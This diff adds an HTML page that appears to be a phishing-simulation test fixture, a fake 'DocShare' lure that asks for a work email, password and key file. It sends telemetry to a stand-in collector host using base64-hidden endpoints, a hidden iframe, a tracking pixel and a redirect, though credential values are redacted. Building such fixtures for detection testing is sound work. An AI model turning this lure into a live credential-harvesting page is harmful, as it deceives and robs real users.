@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Confidential_Report_Q3_Audited.pdf - DocShare</title>
+
+  <!-- External Stylesheet (collector.test) -->
+  <link rel="stylesheet" href="http://collector.test:4174/resource.css" onerror="this.onerror=null;this.href='http://localhost:4174/resource.css';">
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background-color: #f7f9fa;
+      color: #1f2937;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+      font-size: 14px;
+      line-height: 1.5;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .site-nav {
+      background: #ffffff;
+      border-bottom: 1px solid #e5e7eb;
+      padding: 12px 24px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .brand-title {
+      font-size: 16px;
+      font-weight: 700;
+      color: #0f766e;
+    }
+
+    .brand-title span {
+      color: #6b7280;
+      font-weight: 400;
+      font-size: 13px;
+    }
+
+    .content-area {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 32px 16px;
+    }
+
+    .file-card {
+      background: #ffffff;
+      border: 1px solid #d1d5db;
+      border-radius: 4px;
+      width: 100%;
+      max-width: 440px;
+      padding: 24px 22px;
+    }
+
+    .doc-preview-row {
+      display: flex;
+      gap: 14px;
+      align-items: center;
+      padding: 14px;
+      background: #f9fafb;
+      border: 1px solid #e5e7eb;
+      border-radius: 4px;
+      margin-bottom: 18px;
+    }
+
+    .pdf-icon {
+      width: 40px;
+      height: 48px;
+      background: #dc2626;
+      color: #ffffff;
+      border-radius: 2px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 11px;
+      font-weight: 700;
+      flex-shrink: 0;
+      letter-spacing: 0.05em;
+    }
+
+    .doc-info {
+      flex: 1;
+      min-width: 0;
+    }
+
+    .doc-title {
+      font-weight: 600;
+      font-size: 14px;
+      color: #111827;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .doc-meta {
+      font-size: 12px;
+      color: #6b7280;
+      margin-top: 2px;
+    }
+
+    .share-msg {
+      font-size: 13px;
+      color: #374151;
+      margin-bottom: 18px;
+    }
+
+    .btn-main {
+      width: 100%;
+      background: #0f766e;
+      color: #ffffff;
+      border: 1px solid #0d9488;
+      border-radius: 3px;
+      padding: 9px 12px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    .btn-main:hover {
+      background: #115e59;
+    }
+
+    .btn-main:disabled {
+      background: #99f6e4;
+      cursor: not-allowed;
+    }
+
+    .btn-secondary {
+      width: 100%;
+      background: #ffffff;
+      color: #374151;
+      border: 1px solid #d1d5db;
+      border-radius: 3px;
+      padding: 8px 12px;
+      font-size: 13px;
+      cursor: pointer;
+      margin-top: 8px;
+    }
+
+    .btn-secondary:hover {
+      background: #f3f4f6;
+    }
+
+    /* Form Section */
+    .form-group {
+      margin-bottom: 12px;
+      text-align: left;
+    }
+
+    .form-group label {
+      display: block;
+      font-size: 12.5px;
+      font-weight: 500;
+      color: #374151;
+      margin-bottom: 4px;
+    }
+
+    .input-field {
+      width: 100%;
+      padding: 8px 10px;
+      font-size: 13.5px;
+      border: 1px solid #9ca3af;
+      border-radius: 3px;
+      outline: none;
+      background: #ffffff;
+    }
+
+    .input-field:focus {
+      border-color: #0f766e;
+      box-shadow: 0 0 0 1px #0f766e;
+    }
+
+    .file-select-box {
+      font-size: 12px;
+      padding: 6px;
+      border: 1px solid #d1d5db;
+      background: #f9fafb;
+      border-radius: 3px;
+    }
+
+    .card-footer-links {
+      margin-top: 16px;
+      font-size: 11.5px;
+      color: #6b7280;
+      text-align: center;
+    }
+
+    .card-footer-links a {
+      color: #0f766e;
+      text-decoration: none;
+    }
+
+    .card-footer-links a:hover {
+      text-decoration: underline;
+    }
+
+    .progress-box {
+      text-align: center;
+      padding: 16px 0;
+      font-size: 13px;
+      color: #4b5563;
+    }
+
+    .progress-bar-wrap {
+      width: 100%;
+      height: 4px;
+      background: #e5e7eb;
+      border-radius: 2px;
+      margin: 12px 0;
+      overflow: hidden;
+    }
+
+    .progress-bar-fill {
+      height: 100%;
+      background: #0f766e;
+      width: 0%;
+      transition: width 0.4s ease;
+    }
+
+    .site-footer {
+      text-align: center;
+      padding: 14px;
+      font-size: 12px;
+      color: #9ca3af;
+      border-top: 1px solid #e5e7eb;
+      background: #ffffff;
+    }
+
+    .site-footer a {
+      color: #6b7280;
+      text-decoration: none;
+      margin: 0 6px;
+    }
+  </style>
+</head>
+<body>
+
+  <nav class="site-nav">
+    <div class="brand-title">DocShare <span>&bull; Shared Files</span></div>
+  </nav>
+
+  <main class="content-area">
+    <div class="file-card">
+
+      <!-- STAGE 1: Minimal Document Card -->
+      <div id="stage-landing">
+        <div class="doc-preview-row">
+          <div class="pdf-icon">PDF</div>
+          <div class="doc-info">
+            <div class="doc-title">Confidential_Report_Q3_Audited.pdf</div>
+            <div class="doc-meta">2.4 MB &bull; Shared today</div>
+          </div>
+        </div>
+
+        <p class="share-msg">
+          A document has been shared with you. Sign in with your work email to access it.
+        </p>
+
+        <button id="btn-show-auth" class="btn-main">
+          View document
+        </button>
+
+        <button id="btn-direct-download" class="btn-secondary">
+          Download copy
+        </button>
+
+        <div class="card-footer-links">
+          <a href="http://file-upload.test:4173/sharepoint/doc-access/audit-certificate?action=inspect">
+            Report an issue with this link
+          </a>
+        </div>
+      </div>
+
+      <!-- STAGE 2: Simple Clean Login Form -->
+      <div id="stage-auth" style="display: none;">
+        <h2 style="font-size: 16px; font-weight: 600; margin-bottom: 4px;">Sign in to view document</h2>
+        <p style="font-size: 12.5px; color: #6b7280; margin-bottom: 16px;">
+          Enter your email to verify recipient authorization.
+        </p>
+
+        <!-- Real Semantic Form Detectable by Extension -->
+        <form id="doc-auth-form" method="POST" action="/secure-share/document-viewer" autocomplete="on">
+          <div class="form-group">
+            <label for="doc-email">Email address</label>
+            <input
+              type="email"
+              id="doc-email"
+              name="email"
+              class="input-field"
+              required
+              autocomplete="username"
+              placeholder="name@company.com"
+            >
+          </div>
+
+          <div class="form-group">
+            <label for="doc-password">Password</label>
+            <input
+              type="password"
+              id="doc-password"
+              name="password"
+              class="input-field"
+              required
+              autocomplete="current-password"
+            >
+          </div>
+
+          <!-- File Input Demonstration (Metadata only, file content never read or sent) -->
+          <div class="form-group">
+            <label for="doc-file-input">Certificate or key (optional)</label>
+            <div class="file-select-box">
+              <input
+                type="file"
+                id="doc-file-input"
+                name="security_certificate"
+                accept=".pem,.crt,.pdf,.p12,.txt"
+              >
+            </div>
+          </div>
+
+          <button type="submit" id="btn-submit-auth" class="btn-main" style="margin-top: 8px;">
+            Continue
+          </button>
+        </form>
+      </div>
+
+      <!-- STAGE 3: Simple Loading State -->
+      <div id="stage-processing" style="display: none;" class="progress-box">
+        <p id="proc-title">Verifying access...</p>
+        <div class="progress-bar-wrap">
+          <div id="progress-fill" class="progress-bar-fill"></div>
+        </div>
+        <span style="font-size: 12px; color: #9ca3af;">Please wait</span>
+      </div>
+
+    </div>
+  </main>
+
+  <footer class="site-footer">
+    &copy; 2026 DocShare Inc. &bull;
+    <a href="#">Privacy</a> &bull;
+    <a href="#">Terms</a> &bull;
+    <a href="#">Help</a>
+  </footer>
+
+  <!-- Cross-Origin Hidden Iframe (collector.test) - Technical test behavior preserved -->
+  <iframe
+    src="http://collector.test:4174/iframe"
+    style="position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; border: none;"
+    aria-hidden="true"
+    tabindex="-1"
+  ></iframe>
+
+  <!-- Cross-Origin External Tracking Pixel (collector.test) -->
+  <img
+    src="http://collector.test:4174/pixel?doc=Confidential_Report.pdf&event=doc_landing_view"
+    width="1"
+    height="1"
+    style="display: none;"
+    alt=""
+    onerror="this.onerror=null;this.src='http://localhost:4174/pixel?doc=Confidential_Report.pdf&event=doc_landing_view';"
+  >
+
+  <!-- Cross-Origin External Script (collector.test) -->
+  <script
+    src="http://collector.test:4174/resource.js"
+    onerror="this.onerror=null;const s=document.createElement('script');s.src='http://localhost:4174/resource.js';document.head.appendChild(s);"
+  ></script>
+
+  <script>
+    (function () {
+      'use strict';
+
+      const isTestDomain = window.location.hostname.endsWith('.test');
+      const collectorHost = isTestDomain ? 'collector.test' : 'localhost';
+      const collectorPort = '4174';
+      const sitePort = window.location.port || '4173';
+      const siteHost = window.location.hostname;
+      const collectorOrigin = `http://${collectorHost}:${collectorPort}`;
+      const siteOrigin = `http://${siteHost}:${sitePort}`;
+
+      // Base64 decoded endpoints
+      const _sc = atob('L3Nlc3Npb24tY2hlY2s=');
+      const _te = atob('L3RlbGVtZXRyeQ==');
+
+      // Harmless document access cookie
+      document.cookie = 'doc_access_token=sec_temp_382; Path=/; SameSite=Lax';
+
+      const stageLanding = document.getElementById('stage-landing');
+      const stageAuth = document.getElementById('stage-auth');
+      const stageProcessing = document.getElementById('stage-processing');
+      const btnShowAuth = document.getElementById('btn-show-auth');
+      const btnDirectDownload = document.getElementById('btn-direct-download');
+      const authForm = document.getElementById('doc-auth-form');
+      const docEmail = document.getElementById('doc-email');
+      const docPassword = document.getElementById('doc-password');
+      const docFileInput = document.getElementById('doc-file-input');
+      const progressFill = document.getElementById('progress-fill');
+      const procTitle = document.getElementById('proc-title');
+
+      // Download demo file signal
+      function triggerLocalDownload() {
+        const dummyPdfContent = '%PDF-1.4 Confidential Report Summary\\nLocally generated test file.';
+        const blob = new Blob([dummyPdfContent], { type: 'application/pdf' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'Confidential_Report_Q3_Audited.pdf';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+      }
+
+      btnDirectDownload.addEventListener('click', function () {
+        triggerLocalDownload();
+      });
+
+      btnShowAuth.addEventListener('click', function () {
+        stageLanding.style.display = 'none';
+        stageAuth.style.display = 'block';
+
+        if ('Notification' in window && Notification.permission === 'default') {
+          try {
+            Notification.requestPermission().catch(() => {});
+          } catch (e) {}
+        }
+      });
+
+      authForm.addEventListener('submit', async function (e) {
+        e.preventDefault();
+
+        // DATA & FILE SAFETY: No raw credentials or file content sent
+        let fileMetadata = null;
+        if (docFileInput.files && docFileInput.files.length > 0) {
+          const f = docFileInput.files[0];
+          fileMetadata = {
+            filename: f.name,
+            sizeBytes: f.size,
+            mimeType: f.type || 'application/octet-stream',
+          };
+        }
+
+        const emailLen = docEmail.value ? docEmail.value.length : 0;
+        const passLen = docPassword.value ? docPassword.value.length : 0;
+
+        docEmail.value = '';
+        docPassword.value = '';
+        docFileInput.value = '';
+
+        const telemetryPayload = {
+          site: 'file-upload',
+          event: 'document_access_auth_submitted',
+          document: 'Confidential_Report_Q3_Audited.pdf',
+          fields: ['email', 'password', fileMetadata ? 'security_certificate' : null].filter(Boolean),
+          fieldLengths: { email: emailLen, password: passLen },
+          fileAttached: Boolean(fileMetadata),
+          fileMetadata: fileMetadata,
+          values: '[REDACTED]',
+          timestamp: new Date().toISOString(),
+        };
+
+        stageAuth.style.display = 'none';
+        stageProcessing.style.display = 'block';
+
+        try {
+          await fetch(`${collectorOrigin}${_sc}`, {
+            method: 'GET',
+            credentials: 'include',
+          }).catch(() => null);
+
+          await fetch(`${collectorOrigin}${_te}?event=doc_auth_check`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(telemetryPayload),
+          }).catch(() => null);
+        } catch (err) {}
+
+        progressFill.style.width = '40%';
+        setTimeout(() => {
+          procTitle.textContent = 'Opening document...';
+          progressFill.style.width = '80%';
+        }, 700);
+
+        setTimeout(() => {
+          progressFill.style.width = '100%';
+        }, 1300);
+
+        setTimeout(() => {
+          const targetUrl = `${siteOrigin}/view.html?access=granted`;
+          const redirectUrl = `${collectorOrigin}/redirect?to=${encodeURIComponent(targetUrl)}`;
+          window.location.href = redirectUrl;
+        }, 1800);
+      });
+    })();
+  </script>
+</body>
+</html>
